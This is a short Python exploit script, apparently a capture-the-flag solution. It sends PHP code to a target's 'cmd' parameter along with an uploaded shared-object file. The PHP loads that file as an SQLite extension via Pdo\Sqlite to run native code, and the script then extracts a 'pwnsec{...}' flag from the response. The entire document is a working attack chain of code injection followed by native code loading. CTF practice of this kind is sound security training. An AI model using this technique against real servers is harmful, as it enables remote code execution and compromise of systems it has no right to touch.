#!/usr/bin/env python3
import re
import sys
from pathlib import Path

import requests


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/index.php"
    payload_path = Path(__file__).resolve().with_name("payload.so")
    php = r'''
$db = new Pdo\Sqlite("sqlite::memory:");
$db->loadExtension($_FILES["extension"]["tmp_name"]);
echo $db->query("SELECT readflag()") -> fetchColumn();
'''
    with payload_path.open("rb") as payload:
        response = requests.post(
            url,
            data={"cmd": php},
            files={"extension": ("payload.so", payload, "application/octet-stream")},
            timeout=15,
        )
    print(response.text, end="")
    match = re.search(r"pwnsec\{[^}\r\n]+\}", response.text)
    if not match:
        raise SystemExit("[-] flag not found in response")
    print(f"[+] flag: {match.group(0)}")


if __name__ == "__main__":
    main()
